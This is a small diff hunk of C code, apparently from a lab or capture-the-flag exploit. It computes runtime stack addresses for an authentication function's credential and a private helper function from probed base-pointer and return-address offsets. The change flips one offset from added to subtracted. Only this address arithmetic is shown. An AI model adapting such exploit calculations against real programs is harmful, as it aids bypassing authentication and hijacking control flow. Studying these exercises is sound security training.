@@ -39,7 +39,7 @@ int main() {
     // Compute the information for the current run using the probed values
     uint64_t cur_auth_bp                = cur_main_bp + auth_main_bp_dist;
     uint64_t cur_auth_cred_loc          = cur_auth_bp + auth_bp_cred_loc_dist;
-    uint64_t curr_auth_cred             = cur_auth_bp + auth_bp_cred_dist;
+    uint64_t curr_auth_cred             = cur_auth_bp - auth_bp_cred_dist;
     uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance;
     
 
